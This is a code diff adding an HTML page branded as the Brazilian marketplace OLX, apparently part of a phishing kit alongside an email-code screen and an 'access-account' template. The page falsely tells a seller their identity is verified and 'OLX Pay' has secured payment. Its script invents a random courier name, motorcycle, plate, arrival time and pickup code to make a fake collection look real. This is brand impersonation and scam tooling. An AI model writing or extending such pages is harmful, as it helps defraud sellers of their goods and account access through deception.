@@ -498,6 +498,170 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
+const VERIFICATION_SUCCESS_HTML = `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verificação aprovada - OLX</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:#f5f5f5;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100%}
+  .topbar{background:#fff;padding:16px 20px;border-bottom:1px solid #e8e8e8;display:flex;align-items:center;gap:10px}
+  .topbar svg{height:36px;width:36px;display:block}
+  .topbar-title{font-size:15px;font-weight:600;color:#1a1a1a}
+  main{max-width:520px;margin:0 auto;padding:20px 16px 60px}
+  .card{background:#fff;border-radius:14px;padding:22px 18px;box-shadow:0 1px 3px rgba(0,0,0,.06);margin-bottom:14px}
+  .badge{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:9999px;font-size:12px;font-weight:600;letter-spacing:.2px}
+  .badge.pending{background:#fff7e6;color:#b76e00}
+  .badge.approved{background:#e6f7ec;color:#117a3a}
+  .badge.dispatch{background:#eaf2ff;color:#0e4ea8}
+  .step{display:flex;gap:14px;align-items:flex-start;padding:14px 0;border-bottom:1px solid #f0f0f0}
+  .step:last-child{border-bottom:0}
+  .step-icon{flex-shrink:0;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff;background:#cfcfcf}
+  .step.done .step-icon{background:#117a3a}
+  .step.active .step-icon{background:#f48120}
+  .step-body{flex:1;min-width:0}
+  .step-title{font-size:15px;font-weight:600;margin:0 0 2px;color:#1a1a1a}
+  .step-sub{font-size:13px;color:#6b6b6b;margin:0}
+  .spinner{display:inline-block;width:14px;height:14px;border:2px solid #f48120;border-right-color:transparent;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .check{display:inline-block;width:16px;height:16px;vertical-align:-3px;margin-right:4px}
+  h2{font-size:18px;font-weight:700;margin:0 0 4px;color:#1a1a1a}
+  .muted{color:#6b6b6b;font-size:13px;margin:0}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f3f3f3;font-size:14px;gap:12px}
+  .row:last-child{border-bottom:0}
+  .row-label{color:#6b6b6b}
+  .row-value{color:#1a1a1a;font-weight:600;text-align:right;word-break:break-word}
+  .moto{display:flex;gap:14px;align-items:center;background:#f8faff;border:1px solid #d6e4ff;border-radius:12px;padding:14px}
+  .moto-avatar{flex-shrink:0;width:54px;height:54px;border-radius:50%;background:#0e4ea8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:700}
+  .moto-name{font-size:15px;font-weight:700;margin:0 0 2px}
+  .moto-meta{font-size:12px;color:#6b6b6b;margin:0;line-height:1.45}
+  .eta{display:flex;align-items:center;justify-content:center;gap:8px;background:#117a3a;color:#fff;border-radius:9999px;padding:10px 14px;font-size:14px;font-weight:600;margin-top:12px}
+  .footer-note{font-size:12px;color:#6b6b6b;text-align:center;line-height:1.45;padding:10px 8px 0}
+  .h-divider{height:1px;background:#eee;margin:14px 0}
+</style>
+</head>
+<body>
+  <header class="topbar">
+    <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <rect width="40" height="40" rx="10" fill="#6E0AD6"/>
+      <text x="20" y="26" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="14" font-weight="700" fill="#fff">OLX</text>
+    </svg>
+    <span class="topbar-title">Verificação de venda</span>
+  </header>
+
+  <main>
+    <div class="card">
+      <span class="badge approved">
+        <svg class="check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        Verificação aprovada
+      </span>
+      <h2 style="margin-top:10px">Tudo certo com a sua conta!</h2>
+      <p class="muted">Confirmamos sua identidade. Estamos preparando o motoboy pra retirar o produto no endereço cadastrado.</p>
+    </div>
+
+    <div class="card">
+      <h2>Status do pedido</h2>
+      <div class="step done">
+        <div class="step-icon">✓</div>
+        <div class="step-body">
+          <p class="step-title">Identidade verificada</p>
+          <p class="step-sub">Conta confirmada com sucesso.</p>
+        </div>
+      </div>
+      <div class="step done">
+        <div class="step-icon">✓</div>
+        <div class="step-body">
+          <p class="step-title">Pagamento liberado pela OLX Pay</p>
+          <p class="step-sub">Valor reservado e segurado pela plataforma.</p>
+        </div>
+      </div>
+      <div class="step active" id="step-moto">
+        <div class="step-icon"><span class="spinner" style="border-color:#fff;border-right-color:transparent;width:12px;height:12px"></span></div>
+        <div class="step-body">
+          <p class="step-title">Motoboy a caminho do seu endereço</p>
+          <p class="step-sub" id="moto-sub">Procurando entregador parceiro mais próximo…</p>
+        </div>
+      </div>
+      <div class="step" id="step-deliver">
+        <div class="step-icon">4</div>
+        <div class="step-body">
+          <p class="step-title">Entrega do produto ao motoboy</p>
+          <p class="step-sub">Aguardando retirada no endereço cadastrado.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" id="moto-card" style="display:none">
+      <span class="badge dispatch">🛵 Motoboy designado</span>
+      <div style="height:12px"></div>
+      <div class="moto">
+        <div class="moto-avatar" id="moto-initials">CR</div>
+        <div style="flex:1;min-width:0">
+          <p class="moto-name" id="moto-name">Carlos Ribeiro</p>
+          <p class="moto-meta" id="moto-meta">Honda CG 160 · Vermelha · placa <strong id="moto-plate">ABC-1J34</strong></p>
+          <p class="moto-meta" style="margin-top:4px">⭐ 4,9 · 1.284 entregas</p>
+        </div>
+      </div>
+      <div class="eta" id="moto-eta">⏱ Chega em 35–50 minutos</div>
+      <div class="h-divider"></div>
+      <div class="row"><span class="row-label">Código de retirada</span><span class="row-value" id="pickup-code">—</span></div>
+      <div class="row"><span class="row-label">Pedido</span><span class="row-value" id="order-id">#OLX-—</span></div>
+      <p class="footer-note">Confirme o código de retirada com o motoboy antes de entregar o produto. <strong>Não compartilhe esse código por mensagem.</strong></p>
+    </div>
+
+    <p class="footer-note">Você pode fechar esta página. Enviaremos atualizações por SMS e e-mail.</p>
+  </main>
+
+  <script>
+    (function(){
+      var firstNames = ['Carlos','Lucas','Bruno','Rafael','Diego','Fernando','Marcos','André','Thiago','Renato'];
+      var lastNames  = ['Ribeiro','Souza','Almeida','Pereira','Oliveira','Santos','Lima','Costa','Martins','Araújo'];
+      var bikes      = ['Honda CG 160','Honda Biz 125','Yamaha Factor 150','Honda PCX','Yamaha Fazer 250'];
+      var colors     = ['Vermelha','Preta','Branca','Azul','Prata'];
+      function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
+      function plate(){
+        var L = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
+        var N = '0123456789';
+        var p = '';
+        for(var i=0;i<3;i++) p += L.charAt(Math.floor(Math.random()*L.length));
+        p += '-';
+        p += N.charAt(Math.floor(Math.random()*10));
+        p += L.charAt(Math.floor(Math.random()*L.length));
+        for(var j=0;j<2;j++) p += N.charAt(Math.floor(Math.random()*10));
+        return p;
+      }
+      var fn = pick(firstNames), ln = pick(lastNames);
+      var fullName = fn + ' ' + ln;
+      var initials = (fn.charAt(0)+ln.charAt(0)).toUpperCase();
+      var bike = pick(bikes);
+      var color = pick(colors);
+      var pl = plate();
+      var minMin = 30 + Math.floor(Math.random()*15);
+      var maxMin = minMin + 10 + Math.floor(Math.random()*10);
+      var pickup = '';
+      for(var k=0;k<6;k++) pickup += Math.floor(Math.random()*10);
+      var orderId = '';
+      for(var m=0;m<7;m++) orderId += Math.floor(Math.random()*10);
+
+      setTimeout(function(){
+        var sub = document.getElementById('moto-sub');
+        if(sub) sub.textContent = 'Entregador localizado · indo até você.';
+        document.getElementById('moto-name').textContent = fullName;
+        document.getElementById('moto-initials').textContent = initials;
+        document.getElementById('moto-meta').innerHTML = bike + ' · ' + color + ' · placa <strong>' + pl + '</strong>';
+        document.getElementById('moto-eta').textContent = '⏱ Chega em ' + minMin + '–' + maxMin + ' minutos';
+        document.getElementById('pickup-code').textContent = pickup;
+        document.getElementById('order-id').textContent = '#OLX-' + orderId;
+        var card = document.getElementById('moto-card');
+        if(card) card.style.display = '';
+      }, 2200);
+    })();
+  </script>
+</body>
+</html>`;
+
 export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
   "access-account": {
     title: "Acesse sua conta",
